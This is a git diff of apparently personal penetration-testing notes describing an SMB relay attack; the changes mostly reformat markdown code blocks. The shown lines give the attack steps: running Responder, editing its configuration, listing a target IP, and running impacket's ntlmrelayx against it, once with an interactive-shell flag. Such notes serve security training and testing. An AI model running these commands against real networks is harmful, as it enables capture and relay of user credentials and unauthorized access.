@@ -9,7 +9,8 @@ responder -I tun0 -dwv
 # SMB Relay Attack
 ```bash 
 'start the responder tool (turn off smb and http)'
-
+```
+```hcl
 nano /etc/responder/Responder.conf 
 
 ┌──(root💀kali)-[/var/www/html/login]
@@ -31,17 +32,18 @@ DNS = On
 LDAP = On
 DCERPC = On
 WINRM = On
-
+```
+```bash
 'then start the tool'
 
 responder -I tun0 -dwv
-
+```
+```bash
 'And save the target in a txt file eg:-'
 
 echo "192.168.18.6" >> target.txt
-
-then start
-
+```
+```bash 
 cd /tools/impacket/exaples
 
 ./ntlmrelayx.py -tf ~/target.txt -smb2support
@@ -74,17 +76,18 @@ DNS = On
 LDAP = On
 DCERPC = On
 WINRM = On
-
+```
+```bash
 'then start the tool'
 
 responder -I tun0 -dwv
-
+```
+```bash 
 'And save the target in a txt file eg:-'
 
 echo "192.168.18.6" >> target.txt
-
-then start
-
+```
+```bash
 cd /tools/impacket/exaples
 
 ./ntlmrelayx.py -tf ~/target.txt -smb2support -i
